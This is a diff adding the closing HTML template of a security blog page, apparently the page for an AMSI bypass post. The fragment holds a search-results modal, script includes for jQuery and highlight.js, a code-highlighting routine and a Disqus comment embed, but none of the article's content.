+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/03/a-view-of-persistence/">
+                <h3 class="media-heading">A View of Persistence</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><blockquote>
+<p>Persistence, noun, the continued or prolonged existence of something.</p>
+</blockquote></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         22 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://rastamouse.me/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js"></script>
+
+
+<script src="https://rastamouse.me/js/script-wl33z0n6ocaypepiqrazthtivfrliqijej4rq8ek8gvrv1awftmgjuv8k4zc.min.js"></script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight').each(function(i, block) {
+    var code = "";
+    hljs.highlightAuto(block.innerText).value.split(/\r\n|\r|\n/).forEach(function(line) {
+      code += "<span class=\"line\">" + line + "</span><br>";
+    });
+    if (code.length > 0) {
+      block.innerHTML = code;  
+    }
+  });
+  $('pre > code').each(function(i, block) {
+    $(this).addClass('codeblock');
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/10\/amsiscanbuffer-bypass-part-1\/';
+          
+            this.page.identifier = '\/2018\/10\/amsiscanbuffer-bypass-part-1\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'rastamouse';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+
+    
+  </body>
+</html>
+
